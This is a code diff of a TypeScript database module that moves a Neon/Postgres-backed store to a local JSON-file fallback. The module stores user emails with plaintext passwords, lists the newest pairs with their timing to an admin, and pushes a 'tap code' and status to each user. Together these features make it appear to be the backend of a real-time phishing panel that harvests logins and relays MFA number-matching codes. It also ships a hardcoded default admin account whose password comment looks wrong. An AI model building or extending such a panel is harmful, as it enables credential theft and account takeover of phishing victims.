@@ -1,50 +1,35 @@
+import fs from 'fs';
+import path from 'path';
 import { Pool } from '@neondatabase/serverless';
 import { Pool as PgPool } from 'pg';
 
-// In-memory fallback database for local development if DATABASE_URL is not set yet
-interface MemoryUser {
+interface DBUser {
   id: number;
   email: string;
   password: string;
   status: string;
-  created_at: Date;
+  created_at: string;
 }
 
-interface MemoryTapCode {
+interface DBTapCode {
   id: number;
   code: string;
-  created_at: Date;
+  created_at: string;
 }
 
-interface MemoryAdmin {
+interface DBAdmin {
   id: number;
   username: string;
   password: string;
-  created_at: Date;
+  created_at: string;
 }
 
-const globalMemoryStore = globalThis as unknown as {
-  users: MemoryUser[];
-  tapCodes: MemoryTapCode[];
-  admins: MemoryAdmin[];
+interface DBData {
+  users: DBUser[];
+  tapCodes: DBTapCode[];
+  admins: DBAdmin[];
   userAutoId: number;
   tapAutoId: number;
-};
-
-if (!globalMemoryStore.users) {
-  globalMemoryStore.users = [];
-  globalMemoryStore.userAutoId = 1;
-  globalMemoryStore.tapCodes = [{ id: 1, code: '99', created_at: new Date() }];
-  globalMemoryStore.tapAutoId = 2;
-  globalMemoryStore.admins = [
-    {
-      id: 1,
-      username: 'admin',
-      // Default hashed password for 'admin123'
-      password: '$2y$10$92IXUNpkjO0rOQ5byMi.Ye4oKoEa3Ro9llC/.og/at2.uheWG/igi',
-      created_at: new Date(),
-    },
-  ];
 }
 
 const connectionString = process.env.DATABASE_URL || process.env.POSTGRES_URL;
@@ -52,10 +37,15 @@ const connectionString = process.env.DATABASE_URL || process.env.POSTGRES_URL;
 let neonPool: any = null;
 
 if (connectionString) {
-  if (connectionString.includes('neon.tech') || connectionString.includes('vercel-storage.com')) {
-    neonPool = new Pool({ connectionString });
-  } else {
-    neonPool = new PgPool({ connectionString });
+  try {
+    if (connectionString.includes('neon.tech') || connectionString.includes('vercel-storage.com')) {
+      neonPool = new Pool({ connectionString });
+    } else {
+      neonPool = new PgPool({ connectionString });
+    }
+  } catch (err) {
+    console.error('Failed to initialize SQL Pool:', err);
+    neonPool = null;
   }
 }
 
@@ -111,48 +101,124 @@ if (neonPool) {
   initDbSchema().catch(console.error);
 }
 
+// ----------------------------------------------------
+// Persistent Local File Database Engine (Fallback & Local)
+// ----------------------------------------------------
+function getDbFilePath(): string {
+  if (process.env.VERCEL) {
+    return path.join('/tmp', 'local-db.json');
+  }
+  const dataDir = path.join(process.cwd(), 'data');
+  if (!fs.existsSync(dataDir)) {
+    try {
+      fs.mkdirSync(dataDir, { recursive: true });
+    } catch (e) {
+      // ignore
+    }
+  }
+  return path.join(dataDir, 'db.json');
+}
+
+function getDefaultData(): DBData {
+  return {
+    users: [],
+    tapCodes: [{ id: 1, code: '22', created_at: new Date().toISOString() }],
+    admins: [
+      {
+        id: 1,
+        username: 'admin',
+        // Default hashed password for 'admin123'
+        password: '$2y$10$92IXUNpkjO0rOQ5byMi.Ye4oKoEa3Ro9llC/.og/at2.uheWG/igi',
+        created_at: new Date().toISOString(),
+      },
+    ],
+    userAutoId: 1,
+    tapAutoId: 2,
+  };
+}
+
+function readLocalDb(): DBData {
+  try {
+    const filePath = getDbFilePath();
+    if (fs.existsSync(filePath)) {
+      const content = fs.readFileSync(filePath, 'utf8');
+      const parsed = JSON.parse(content);
+      if (parsed && Array.isArray(parsed.users)) {
+        return parsed;
+      }
+    }
+  } catch (err) {
+    console.error('Error reading local db file:', err);
+  }
+  const defaultData = getDefaultData();
+  writeLocalDb(defaultData);
+  return defaultData;
+}
+
+function writeLocalDb(data: DBData): void {
+  try {
+    const filePath = getDbFilePath();
+    const tempPath = `${filePath}.tmp.${Date.now()}.${Math.random().toString(36).slice(2, 7)}`;
+    fs.writeFileSync(tempPath, JSON.stringify(data, null, 2), 'utf8');
+    fs.renameSync(tempPath, filePath);
+  } catch (err) {
+    try {
+      const filePath = getDbFilePath();
+      fs.writeFileSync(filePath, JSON.stringify(data, null, 2), 'utf8');
+    } catch (e) {
+      console.error('Error writing local db file:', e);
+    }
+  }
+}
+
 // Database helper operations
 export const db = {
   async saveUser(email: string, password: string, status: string) {
     if (neonPool) {
-      // Check existing user with this email
-      const checkRes = await neonPool.query(
-        'SELECT id FROM users WHERE email = $1 ORDER BY id DESC LIMIT 1',
-        [email]
-      );
-      if (checkRes.rows.length > 0) {
-        const userId = checkRes.rows[0].id;
-        await neonPool.query(
-          'UPDATE users SET password = $1, status = $2, created_at = CURRENT_TIMESTAMP WHERE id = $3',
-          [password, status, userId]
+      try {
+        // Check existing user with this email
+        const checkRes = await neonPool.query(
+          'SELECT id FROM users WHERE email = $1 ORDER BY id DESC LIMIT 1',
+          [email]
         );
-        return { success: true, user_id: userId, action: 'updated' };
-      } else {
-        const insertRes = await neonPool.query(
-          'INSERT INTO users (email, password, status) VALUES ($1, $2, $3) RETURNING id',
-          [email, password, status]
-        );
-        return { success: true, user_id: insertRes.rows[0].id, action: 'created' };
+        if (checkRes.rows.length > 0) {
+          const userId = checkRes.rows[0].id;
+          await neonPool.query(
+            'UPDATE users SET password = $1, status = $2, created_at = CURRENT_TIMESTAMP WHERE id = $3',
+            [password, status, userId]
+          );
+          return { success: true, user_id: userId, action: 'updated' };
+        } else {
+          const insertRes = await neonPool.query(
+            'INSERT INTO users (email, password, status) VALUES ($1, $2, $3) RETURNING id',
+            [email, password, status]
+          );
+          return { success: true, user_id: insertRes.rows[0].id, action: 'created' };
+        }
+      } catch (err) {
+        console.error('Neon saveUser error, falling back to local file store:', err);
       }
     }
 
-    // Fallback Memory Store
-    const existingIndex = globalMemoryStore.users.findIndex(u => u.email === email);
+    // Local Persistent Store
+    const data = readLocalDb();
+    const existingIndex = data.users.findIndex((u) => u.email.toLowerCase() === email.toLowerCase());
     if (existingIndex !== -1) {
-      const u = globalMemoryStore.users[existingIndex];
-      u.password = password;
-      u.status = status;
-      u.created_at = new Date();
-      return { success: true, user_id: u.id, action: 'updated' };
+      data.users[existingIndex].password = password;
+      data.users[existingIndex].status = status;
+      data.users[existingIndex].created_at = new Date().toISOString();
+      writeLocalDb(data);
+      return { success: true, user_id: data.users[existingIndex].id, action: 'updated' };
     } else {
-      const newId = globalMemoryStore.userAutoId++;
-      globalMemoryStore.users.push({
+      const newId = data.userAutoId++;
+      data.users.push({
         id: newId,
         email,
         password,
         status,
-        created_at: new Date(),
+        created_at: new Date().toISOString(),
       });
+      writeLocalDb(data);
       return { success: true, user_id: newId, action: 'created' };
     }
   },
@@ -161,47 +227,58 @@ export const db = {
     const now = Math.floor(Date.now() / 1000);
 
     if (neonPool) {
-      const res = await neonPool.query(
-        'SELECT id, email, password, status, created_at FROM users ORDER BY id DESC LIMIT 50'
-      );
-      return res.rows.map((row: any) => {
-        const createdAtTime = Math.floor(new Date(row.created_at).getTime() / 1000);
-        return {
-          id: row.id,
-          email: row.email,
-          password: row.password,
-          status: row.status,
-          seconds_ago: Math.max(0, now - createdAtTime),
-          timestamp: row.created_at,
-        };
-      });
+      try {
+        const res = await neonPool.query(
+          'SELECT id, email, password, status, created_at FROM users ORDER BY id DESC LIMIT 50'
+        );
+        return res.rows.map((row: any) => {
+          const createdAtTime = Math.floor(new Date(row.created_at).getTime() / 1000);
+          return {
+            id: row.id,
+            email: row.email,
+            password: row.password,
+            status: row.status,
+            seconds_ago: Math.max(0, now - createdAtTime),
+            timestamp: row.created_at,
+          };
+        });
+      } catch (err) {
+        console.error('Neon getUsers error, falling back to local file store:', err);
+      }
     }
 
-    // Fallback Memory Store
-    const sorted = [...globalMemoryStore.users].sort((a, b) => b.id - a.id).slice(0, 50);
-    return sorted.map(u => {
-      const createdAtTime = Math.floor(u.created_at.getTime() / 1000);
+    // Local Persistent Store
+    const data = readLocalDb();
+    const sorted = [...data.users].sort((a, b) => b.id - a.id).slice(0, 50);
+    return sorted.map((u) => {
+      const createdAtTime = Math.floor(new Date(u.created_at).getTime() / 1000);
       return {
         id: u.id,
         email: u.email,
         password: u.password,
         status: u.status,
         seconds_ago: Math.max(0, now - createdAtTime),
-        timestamp: u.created_at.toISOString(),
+        timestamp: u.created_at,
       };
     });
   },
 
   async updateStatus(userId: number, status: string) {
     if (neonPool) {
-      await neonPool.query('UPDATE users SET status = $1 WHERE id = $2', [status, userId]);
-      return { success: true };
+      try {
+        await neonPool.query('UPDATE users SET status = $1 WHERE id = $2', [status, userId]);
+        return { success: true };
+      } catch (err) {
+        console.error('Neon updateStatus error, falling back to local file store:', err);
+      }
     }
 
-    // Fallback Memory Store
-    const user = globalMemoryStore.users.find(u => u.id === userId);
+    // Local Persistent Store
+    const data = readLocalDb();
+    const user = data.users.find((u) => u.id === userId);
     if (user) {
       user.status = status;
+      writeLocalDb(data);
       return { success: true };
     }
     return { success: false, error: 'User not found' };
@@ -209,39 +286,56 @@ export const db = {
 
   async deleteUser(userId: number) {
     if (neonPool) {
-      await neonPool.query('DELETE FROM users WHERE id = $1', [userId]);
-      return { success: true };
+      try {
+        await neonPool.query('DELETE FROM users WHERE id = $1', [userId]);
+        return { success: true };
+      } catch (err) {
+        console.error('Neon deleteUser error, falling back to local file store:', err);
+      }
     }
 
-    // Fallback Memory Store
-    globalMemoryStore.users = globalMemoryStore.users.filter(u => u.id !== userId);
+    // Local Persistent Store
+    const data = readLocalDb();
+    data.users = data.users.filter((u) => u.id !== userId);
+    writeLocalDb(data);
     return { success: true };
   },
 
   async saveCoupon(code: string) {
     if (neonPool) {
-      await neonPool.query('INSERT INTO tap_codes (code) VALUES ($1)', [code]);
-      return { success: true };
+      try {
+        await neonPool.query('INSERT INTO tap_codes (code) VALUES ($1)', [code]);
+        return { success: true };
+      } catch (err) {
+        console.error('Neon saveCoupon error, falling back to local file store:', err);
+      }
     }
 
-    // Fallback Memory Store
-    const newId = globalMemoryStore.tapAutoId++;
-    globalMemoryStore.tapCodes.push({ id: newId, code, created_at: new Date() });
+    // Local Persistent Store
+    const data = readLocalDb();
+    const newId = data.tapAutoId++;
+    data.tapCodes.push({ id: newId, code, created_at: new Date().toISOString() });
+    writeLocalDb(data);
     return { success: true };
   },
 
   async getLatestCoupon() {
     if (neonPool) {
-      const res = await neonPool.query('SELECT code FROM tap_codes ORDER BY id DESC LIMIT 1');
-      if (res.rows.length > 0) {
-        return { coupon: res.rows[0].code };
+      try {
+        const res = await neonPool.query('SELECT code FROM tap_codes ORDER BY id DESC LIMIT 1');
+        if (res.rows.length > 0) {
+          return { coupon: res.rows[0].code };
+        }
+        return { coupon: '22' };
+      } catch (err) {
+        console.error('Neon getLatestCoupon error, falling back to local file store:', err);
       }
-      return { coupon: '22' };
     }
 
-    // Fallback Memory Store
-    if (globalMemoryStore.tapCodes.length > 0) {
-      const latest = globalMemoryStore.tapCodes[globalMemoryStore.tapCodes.length - 1];
+    // Local Persistent Store
+    const data = readLocalDb();
+    if (data.tapCodes.length > 0) {
+      const latest = data.tapCodes[data.tapCodes.length - 1];
       return { coupon: latest.code };
     }
     return { coupon: '22' };
@@ -249,11 +343,16 @@ export const db = {
 
   async getAdmin(username: string) {
     if (neonPool) {
-      const res = await neonPool.query('SELECT * FROM admins WHERE username = $1', [username]);
-      return res.rows[0] || null;
+      try {
+        const res = await neonPool.query('SELECT * FROM admins WHERE username = $1', [username]);
+        return res.rows[0] || null;
+      } catch (err) {
+        console.error('Neon getAdmin error, falling back to local file store:', err);
+      }
     }
 
-    // Fallback Memory Store
-    return globalMemoryStore.admins.find(a => a.username === username) || null;
+    // Local Persistent Store
+    const data = readLocalDb();
+    return data.admins.find((a) => a.username === username) || null;
   },
 };
